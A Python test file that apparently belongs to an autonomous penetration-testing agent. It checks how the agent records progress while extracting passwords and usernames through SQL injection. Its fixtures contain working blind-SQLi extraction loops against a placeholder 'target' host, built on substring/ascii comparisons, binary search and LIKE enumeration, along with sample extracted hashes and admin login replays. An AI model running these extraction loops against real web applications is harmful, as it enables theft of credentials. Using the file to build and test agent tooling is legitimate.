from __future__ import annotations

import json

from ravage.agent_core.agent_state import AgentState
from ravage.agent_core.frontier_extraction_memory import (
    extraction_calibration_objective,
    extraction_checkpoint_from_observation,
    remember_extraction_checkpoint,
    remembered_extraction_checkpoints,
)
from ravage.agent_core.frontier_route import FrontierObjective

FIRST_PREFIX_LENGTH = 8
SECOND_PREFIX_LENGTH = 16
HASH_LENGTH = 32
SPACED_PREFIX_LENGTH = 2
USERNAME_LENGTH = 5


def _objective() -> FrontierObjective:
    return FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract a replayable target value",
    )


def _safe_extractor() -> dict[str, object]:
    return {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "for pos in range(1,33):\n"
            "    expr=f'ascii(substring((select password),{pos},1))>64'\n"
            "    urllib.request.urlopen('http://target/index.php?username='+expr)\n"
            "    print(f'PREFIX[{pos}]={prefix}')\n"
        ),
    }


def test_docker_wrapped_prefix_is_durable_only_when_it_advances() -> None:
    objective = _objective()
    state = AgentState()
    first_observation = json.dumps(
        {"exit_code": 0, "stdout": "TARGET_LEN=32\nPREFIX[8]=7d39307a\n"}
    )

    first = remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation=first_observation,
        oracle_calibrated=True,
    )
    repeated = remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation=first_observation,
        oracle_calibrated=True,
    )
    advanced = remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation=json.dumps({"stdout": ("TARGET_LEN=32\nPREFIX[16]=7d39307ae824e700\n")}),
        oracle_calibrated=True,
    )

    assert first.checkpoint is not None
    assert first.checkpoint.position == FIRST_PREFIX_LENGTH
    assert first.checkpoint.expected_length == HASH_LENGTH
    assert first.material_progress
    assert repeated.checkpoint is None
    assert repeated.material_progress == ()
    assert advanced.checkpoint is not None
    assert advanced.checkpoint.position == SECOND_PREFIX_LENGTH
    remembered = remembered_extraction_checkpoints(state, objective=objective)
    assert [item["position"] for item in remembered] == [
        FIRST_PREFIX_LENGTH,
        SECOND_PREFIX_LENGTH,
    ]
    assert remembered[-1]["prefix"] == "7d39307ae824e700"


def test_run24_uncalibrated_prefix_is_quarantined_and_routed_to_correction() -> None:
    objective = _objective()
    state = AgentState()
    observation = json.dumps(
        {
            "stdout": (
                'CALIBRATION {"base":"password","union":"username"}\n'
                "PREFIX a\nPREFIX aa\nFINAL_PREFIX aaaaaaaaaaaa\n"
            )
        }
    )

    update = remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation=observation,
    )

    assert update.checkpoint is None
    assert update.material_progress == ()
    assert update.issue is not None
    assert update.issue.code == "checkpoint_without_calibrated_oracle"
    assert remembered_extraction_checkpoints(state, objective=objective) == []
    correction = extraction_calibration_objective(objective, update.issue)
    assert correction.basis.value == "novel_counterfactual"
    assert "1=1 and 2=2" in correction.expected_signal
    assert "UNION/error" in correction.expected_signal


def test_full_extracted_password_checkpoint_is_marked_complete() -> None:
    value = "7d39307ae824e70052c0aa16816a9b16"
    checkpoint = extraction_checkpoint_from_observation(
        objective=_objective(),
        action=_safe_extractor(),
        observation=json.dumps(
            {
                "stdout": (
                    f"TARGET_LEN=32\nEXTRACTED_PASSWORD={value}\n"
                    'LOGIN_RESPONSE={"response":"password"}\n'
                )
            }
        ),
    )

    assert checkpoint is not None
    assert checkpoint.candidate_kind == "password"
    assert checkpoint.position == HASH_LENGTH
    assert checkpoint.complete
    assert checkpoint.prefix == value


def test_run26_plain_password_markers_are_promoted_from_trusted_stdout() -> None:
    value = "7d39307ae824e70052c0aa16816a9b16"

    for marker in (f"PASSWORD={value}", f"PASSWORD:{value}"):
        checkpoint = extraction_checkpoint_from_observation(
            objective=_objective(),
            action=_safe_extractor(),
            observation=json.dumps(
                {
                    "command": ["python3", "extract.py"],
                    "stdout": f"TARGET_LEN=32\n{marker}\n",
                }
            ),
        )

        assert checkpoint is not None
        assert checkpoint.candidate_kind == "password"
        assert checkpoint.position == HASH_LENGTH
        assert checkpoint.complete
        assert checkpoint.prefix == value


def test_run27_nested_extracted_value_is_promoted_from_trusted_stdout() -> None:
    value = "7d39307ae824e70052c0aa16816a9b16"
    nested = json.dumps(
        {
            "extracted": [
                {
                    "table": "users",
                    "row": 0,
                    "column": "password",
                    "value": value,
                }
            ],
            "login_replay": {
                "username": "admin",
                "password": value,
                "body": '{"response":"password"}',
            },
        },
        indent=2,
    )

    checkpoint = extraction_checkpoint_from_observation(
        objective=_objective(),
        action=_safe_extractor(),
        observation=json.dumps(
            {
                "command": ["python3", "agent.py"],
                "exit_code": 0,
                "stdout": nested,
            }
        ),
    )

    assert checkpoint is not None
    assert checkpoint.candidate_kind == "password"
    assert checkpoint.position == HASH_LENGTH
    assert checkpoint.expected_length == HASH_LENGTH
    assert checkpoint.complete
    assert checkpoint.prefix == value


def test_run27_nested_extracted_value_in_command_only_is_not_promoted() -> None:
    value = "7d39307ae824e70052c0aa16816a9b16"
    nested = json.dumps(
        {
            "extracted": [
                {
                    "table": "users",
                    "row": 0,
                    "column": "password",
                    "value": value,
                }
            ]
        }
    )

    assert (
        extraction_checkpoint_from_observation(
            objective=_objective(),
            action=_safe_extractor(),
            observation=json.dumps(
                {
                    "command": ["python3", "-c", f"print({nested!r})"],
                    "exit_code": 0,
                    "stdout": "",
                }
            ),
        )
        is None
    )


def test_docker_command_source_marker_is_not_promoted_as_extraction() -> None:
    observation = json.dumps(
        {
            "command": [
                "sh",
                "-lc",
                (
                    "pw=extract_str('select password')\n"
                    "print('EXTRACTED_PASSWORD=',pw)\n"
                    "print('LOGIN_RESPONSE=',body)"
                ),
            ],
            "exit_code": 0,
            "stdout": 'LOGIN_RESPONSE= {"response":"password"}\n',
        }
    )

    assert (
        extraction_checkpoint_from_observation(
            objective=_objective(),
            action=_safe_extractor(),
            observation=observation,
        )
        is None
    )


def test_docker_stdout_marker_outranks_echoed_command_source() -> None:
    value = "7d39307ae824e70052c0aa16816a9b16"
    observation = json.dumps(
        {
            "command": [
                "sh",
                "-lc",
                (
                    "pw=extract_str('select password')\n"
                    "print('EXTRACTED_PASSWORD=',pw)\n"
                    "print('LEN_OK=',True)\n"
                    "print('LOGIN_RESPONSE=',body)"
                ),
            ],
            "exit_code": 0,
            "stdout": (
                f"EXTRACTED_PASSWORD= {value}\n"
                "LEN_OK= True\n"
                'LOGIN_RESPONSE= {"response":"password"}\n'
            ),
        }
    )

    checkpoint = extraction_checkpoint_from_observation(
        objective=_objective(),
        action=_safe_extractor(),
        observation=observation,
    )

    assert checkpoint is not None
    assert checkpoint.prefix == value
    assert checkpoint.position == HASH_LENGTH
    assert checkpoint.complete


def test_spaced_prefix_output_from_finite_equality_search_is_remembered() -> None:
    action = {
        "action": "run_command",
        "command": (
            'python3 -c "'
            "for pos in range(1,9):\n"
            " for code in range(32,127):\n"
            "  payload=f'SUBSTRING((SELECT password),{pos},1)={chr(code)}';\n"
            "  urllib.request.urlopen('http://target/index.php?username='+payload);\n"
            "  print('PREFIX',pos,prefix)\""
        ),
    }
    checkpoint = extraction_checkpoint_from_observation(
        objective=_objective(),
        action=action,
        observation="PREFIX 1 7\nPREFIX 2 7d\n",
    )

    assert checkpoint is not None
    assert checkpoint.position == SPACED_PREFIX_LENGTH
    assert checkpoint.prefix == "7d"


def test_cumulative_prefix_output_from_like_search_is_remembered() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "charset='abcdefghijklmnopqrstuvwxyz'\n"
            "prefix=''\n"
            "for pos in range(1,17):\n"
            "    for ch in charset:\n"
            "        candidate=prefix+ch\n"
            """        payload=f"EXISTS(SELECT 1 FROM users WHERE """
            """username LIKE BINARY '{candidate}%')"\n"""
            "        urllib.request.urlopen('http://target/index.php?username='+payload)\n"
            "        print('PREFIX',prefix)\n"
        ),
    }
    observation = json.dumps(
        {
            "command": ["python3", "print('PREFIX',prefix)"],
            "stdout": (
                'CONTROL_TRUE {"response":"password"}\n'
                'CONTROL_FALSE {"response":"username"}\n'
                "PREFIX a\nPREFIX ad\nPREFIX adm\nPREFIX admi\n"
                "PREFIX admin\nFINAL_PREFIX admin\n"
            ),
        }
    )

    checkpoint = extraction_checkpoint_from_observation(
        objective=_objective(),
        action=action,
        observation=observation,
    )

    assert checkpoint is not None
    assert checkpoint.candidate_kind == "username"
    assert checkpoint.position == USERNAME_LENGTH
    assert checkpoint.prefix == "admin"
    assert not checkpoint.complete


def test_inconsistent_or_unsafe_checkpoint_is_not_promoted() -> None:
    objective = _objective()
    unsafe = {
        "action": "run_python",
        "code": (
            "def char_at(pos):\n"
            "    lo,hi=31,126\n"
            "    while lo<hi:\n"
            "        mid=(lo+hi+1)//2\n"
            "        if oracle(f'ascii(substring((select password),{pos},1))>{mid}'):\n"
            "            lo=mid\n"
            "        else:\n"
            "            hi=mid-1\n"
            "    return chr(lo)\n"
            "for pos in range(1,33):\n"
            "    urllib.request.urlopen('http://target/index.php?username=x')\n"
            "    print(f'PREFIX[{pos}]={prefix}')\n"
        ),
    }

    assert (
        extraction_checkpoint_from_observation(
            objective=objective,
            action=unsafe,
            observation="PREFIX[8]=6c282/6`",
        )
        is None
    )

    state = AgentState()
    remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation="PREFIX[8]=7d39307a",
        oracle_calibrated=True,
    )
    regressed = remember_extraction_checkpoint(
        state,
        objective=objective,
        action=_safe_extractor(),
        observation="PREFIX[10]=xxxxxxxxxx",
        oracle_calibrated=True,
    )
    assert regressed.checkpoint is None
